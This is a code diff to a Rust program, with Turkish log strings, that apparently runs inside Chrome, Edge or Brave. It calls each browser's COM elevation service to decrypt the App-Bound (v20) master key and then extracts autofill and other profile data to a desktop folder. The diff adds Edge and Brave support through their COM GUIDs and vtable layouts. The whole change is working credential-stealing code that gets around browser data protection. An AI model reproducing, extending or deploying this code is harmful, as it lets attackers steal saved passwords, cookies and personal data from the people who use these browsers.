@@ -65,26 +65,44 @@ use aes_gcm::{
     Aes256Gcm, Nonce,
 };
 
-// Chrome 144+ için CLSID
-const CLSID_ELEVATOR: GUID = GUID {
-    Data1: 0x708860E0,
-    Data2: 0xF641,
-    Data3: 0x4611,
-    Data4: [0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B],
-};
+#[derive(Clone, Copy, Debug, PartialEq)]
+enum Browser {
+    Chrome,
+    Edge,
+    Brave,
+}
 
-const IID_IELEVATOR2: GUID = GUID {
-    Data1: 0x1BF5208B,
-    Data2: 0x295F,
-    Data3: 0x4992,
-    Data4: [0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38],
-};
+// Browser specific COM constants
+const CLSID_CHROME_ELEVATOR: GUID = GUID { Data1: 0x708860E0, Data2: 0xF641, Data3: 0x4611, Data4: [0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B] };
+const IID_CHROME_IELEVATOR1: GUID = GUID { Data1: 0x463ABECF, Data2: 0x410D, Data3: 0x407F, Data4: [0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8] };
+const IID_CHROME_IELEVATOR2: GUID = GUID { Data1: 0x1BF5208B, Data2: 0x295F, Data3: 0x4992, Data4: [0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38] };
+
+const CLSID_EDGE_ELEVATOR: GUID = GUID { Data1: 0x1FCBE96C, Data2: 0x1697, Data3: 0x43AF, Data4: [0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67] };
+const IID_EDGE_IELEVATOR1: GUID = GUID { Data1: 0xC9C2B807, Data2: 0x7731, Data3: 0x4F34, Data4: [0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B] };
+const IID_EDGE_IELEVATOR2: GUID = GUID { Data1: 0x8F7B6792, Data2: 0x784D, Data3: 0x4047, Data4: [0x84, 0x5D, 0x17, 0x82, 0xEF, 0xBE, 0xF2, 0x05] };
+
+const CLSID_BRAVE_ELEVATOR: GUID = GUID { Data1: 0x576B31AF, Data2: 0x6369, Data3: 0x4B6B, Data4: [0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B] };
+const IID_BRAVE_IELEVATOR1: GUID = GUID { Data1: 0xF396861E, Data2: 0x0C8E, Data3: 0x4C71, Data4: [0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0xE9] };
+const IID_BRAVE_IELEVATOR2: GUID = GUID { Data1: 0x1BF5208B, Data2: 0x295F, Data3: 0x4992, Data4: [0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38] };
 
 #[repr(C)]
 struct IElevatorVTbl {
     QueryInterface: unsafe extern "system" fn(*mut c_void, *const GUID, *mut *mut c_void) -> i32,
     AddRef: unsafe extern "system" fn(*mut c_void) -> u32,
     Release: unsafe extern "system" fn(*mut c_void) -> u32,
+    RunRecoveryCRXElevated: unsafe extern "system" fn(*mut c_void, *const u16, *const u16, *const u16, u32, *mut u32) -> i32,
+    EncryptData: unsafe extern "system" fn(*mut c_void, u32, BSTR, *mut BSTR, *mut u32) -> i32,
+    DecryptData: unsafe extern "system" fn(*mut c_void, BSTR, *mut BSTR, *mut u32) -> i32,
+}
+
+#[repr(C)]
+struct IEdgeElevatorVTbl {
+    QueryInterface: unsafe extern "system" fn(*mut c_void, *const GUID, *mut *mut c_void) -> i32,
+    AddRef: unsafe extern "system" fn(*mut c_void) -> u32,
+    Release: unsafe extern "system" fn(*mut c_void) -> u32,
+    EdgeBaseMethod1: unsafe extern "system" fn(*mut c_void) -> i32,
+    EdgeBaseMethod2: unsafe extern "system" fn(*mut c_void) -> i32,
+    EdgeBaseMethod3: unsafe extern "system" fn(*mut c_void) -> i32,
     RunRecoveryCRXElevated: unsafe extern "system" fn(*mut c_void, *const u16, *const u16, *const u16, u32, *mut u32) -> i32,
     EncryptData: unsafe extern "system" fn(*mut c_void, u32, BSTR, *mut BSTR, *mut u32) -> i32,
     DecryptData: unsafe extern "system" fn(*mut c_void, BSTR, *mut BSTR, *mut u32) -> i32,
@@ -130,7 +148,13 @@ fn decrypt_dpapi(data: &[u8]) -> Result<Vec<u8>, String> {
     }
 }
 
-fn decrypt_with_elevator(encrypted_blob: &[u8]) -> Result<Vec<u8>, String> {
+fn decrypt_with_elevator(encrypted_blob: &[u8], browser: Browser) -> Result<Vec<u8>, String> {
+    let (clsid, iids) = match browser {
+        Browser::Chrome => (CLSID_CHROME_ELEVATOR, vec![IID_CHROME_IELEVATOR2, IID_CHROME_IELEVATOR1]),
+        Browser::Edge => (CLSID_EDGE_ELEVATOR, vec![IID_EDGE_IELEVATOR2, IID_EDGE_IELEVATOR1]),
+        Browser::Brave => (CLSID_BRAVE_ELEVATOR, vec![IID_BRAVE_IELEVATOR2, IID_BRAVE_IELEVATOR1]),
+    };
+
     unsafe {
         let hr = CoInitializeEx(ptr::null_mut(), COINIT_APARTMENTTHREADED);
         let co_init = hr >= 0 || hr as u32 == 0x80010106;
@@ -140,7 +164,12 @@ fn decrypt_with_elevator(encrypted_blob: &[u8]) -> Result<Vec<u8>, String> {
 
         let result = (|| {
             let mut elevator_ptr: *mut c_void = ptr::null_mut();
-            let hr = CoCreateInstance(&CLSID_ELEVATOR, ptr::null_mut(), CLSCTX_LOCAL_SERVER, &IID_IELEVATOR2, &mut elevator_ptr);
+            let mut hr = -1;
+
+            for iid in iids {
+                hr = CoCreateInstance(&clsid, ptr::null_mut(), CLSCTX_LOCAL_SERVER, &iid, &mut elevator_ptr);
+                if hr >= 0 { break; }
+            }
 
             if hr < 0 {
                 return Err(format!("CoCreateInstance başarısız: 0x{:08X}", hr as u32));
@@ -160,12 +189,19 @@ fn decrypt_with_elevator(encrypted_blob: &[u8]) -> Result<Vec<u8>, String> {
 
             let mut bstr_decrypted: BSTR = ptr::null_mut();
             let mut last_error: u32 = 0;
-            let vtable = *(elevator_ptr as *const *const IElevatorVTbl);
-            let hr = ((*vtable).DecryptData)(elevator_ptr, bstr_encrypted, &mut bstr_decrypted, &mut last_error);
+
+            let hr = if browser == Browser::Edge {
+                let vtable = *(elevator_ptr as *const *const IEdgeElevatorVTbl);
+                ((*vtable).DecryptData)(elevator_ptr, bstr_encrypted, &mut bstr_decrypted, &mut last_error)
+            } else {
+                let vtable = *(elevator_ptr as *const *const IElevatorVTbl);
+                ((*vtable).DecryptData)(elevator_ptr, bstr_encrypted, &mut bstr_decrypted, &mut last_error)
+            };
 
             SysFreeString(bstr_encrypted);
 
             if hr < 0 {
+                let vtable = *(elevator_ptr as *const *const IElevatorVTbl);
                 ((*vtable).Release)(elevator_ptr);
                 return Err(format!("DecryptData başarısız: 0x{:08X}, last_error: {}", hr as u32, last_error));
             }
@@ -173,6 +209,7 @@ fn decrypt_with_elevator(encrypted_blob: &[u8]) -> Result<Vec<u8>, String> {
             let byte_len = SysStringByteLen(bstr_decrypted) as usize;
             let decrypted = std::slice::from_raw_parts(bstr_decrypted as *const u8, byte_len).to_vec();
             SysFreeString(bstr_decrypted);
+            let vtable = *(elevator_ptr as *const *const IElevatorVTbl);
             ((*vtable).Release)(elevator_ptr);
 
             Ok(decrypted)
@@ -193,9 +230,35 @@ fn aes_gcm_decrypt(key: &[u8], data: &[u8]) -> Result<Vec<u8>, String> {
     cipher.decrypt(nonce, ciphertext).map_err(|e| e.to_string())
 }
 
+fn get_current_browser() -> Browser {
+    let mut exe_path = [0u16; 260];
+    unsafe {
+        winapi::um::libloaderapi::GetModuleFileNameW(ptr::null_mut(), exe_path.as_mut_ptr(), 260);
+    }
+    let exe_name = String::from_utf16_lossy(&exe_path).to_lowercase();
+    if exe_name.contains("msedge.exe") {
+        Browser::Edge
+    } else if exe_name.contains("brave.exe") {
+        Browser::Brave
+    } else {
+        Browser::Chrome
+    }
+}
+
 fn do_work() -> Result<(), Box<dyn std::error::Error>> {
-    unsafe { winapi::um::debugapi::OutputDebugStringA(b"do_work started\0".as_ptr() as *const i8); }
-    let _ = log_message("İşlem başlatıldı...");
+    let browser = get_current_browser();
+    let browser_name = match browser {
+        Browser::Chrome => "Chrome",
+        Browser::Edge => "Edge",
+        Browser::Brave => "Brave",
+    };
+
+    unsafe {
+        let msg = format!("do_work started in {}\0", browser_name);
+        winapi::um::debugapi::OutputDebugStringA(msg.as_ptr() as *const i8);
+    }
+
+    let _ = log_message(&format!("İşlem başlatıldı ({})...", browser_name));
     let user_profile = match std::env::var("USERPROFILE") {
         Ok(p) => p,
         Err(_) => {
@@ -203,14 +266,23 @@ fn do_work() -> Result<(), Box<dyn std::error::Error>> {
             return Ok(());
         }
     };
-    let chrome_data_path = Path::new(&user_profile).join("AppData\\Local\\Google\\Chrome\\User Data");
+
+    let chrome_data_path = match browser {
+        Browser::Chrome => Path::new(&user_profile).join("AppData\\Local\\Google\\Chrome\\User Data"),
+        Browser::Edge => Path::new(&user_profile).join("AppData\\Local\\Microsoft\\Edge\\User Data"),
+        Browser::Brave => Path::new(&user_profile).join("AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data"),
+    };
+
     let desktop_db_path = Path::new(&user_profile).join("Desktop\\chrome_db");
 
     let _ = fs::create_dir_all(&desktop_db_path);
 
     let local_state_path = chrome_data_path.join("Local State");
     if !local_state_path.exists() {
-        unsafe { winapi::um::debugapi::OutputDebugStringA(b"Local State not found\0".as_ptr() as *const i8); }
+        unsafe {
+            let msg = format!("Local State not found at {:?}\0", local_state_path);
+            winapi::um::debugapi::OutputDebugStringA(msg.as_ptr() as *const i8);
+        }
         let _ = log_message("Local State bulunamadı");
     }
 
@@ -255,7 +327,7 @@ fn do_work() -> Result<(), Box<dyn std::error::Error>> {
             use base64::engine::Engine as _;
             if let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(b64) {
                 let blob = if decoded.starts_with(b"APPB") { &decoded[4..] } else { &decoded };
-                match decrypt_with_elevator(blob) {
+                match decrypt_with_elevator(blob, browser) {
                     Ok(k) => {
                         v20_key = k;
                         if let Some(ref mut f) = master_keys_file {
@@ -339,6 +411,7 @@ fn do_work() -> Result<(), Box<dyn std::error::Error>> {
             let temp_db = profile_output_path.join("Web_Data.tmp");
             if fs::copy(&web_data_db, &temp_db).is_ok() {
                 if let Ok(conn) = rusqlite::Connection::open(&temp_db) {
+                    // Chromium-based browsers store autofill in 'autofill' table
                     if let Ok(mut stmt) = conn.prepare("SELECT name, value FROM autofill") {
                         let rows = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?)));
                         if let Ok(rows) = rows {
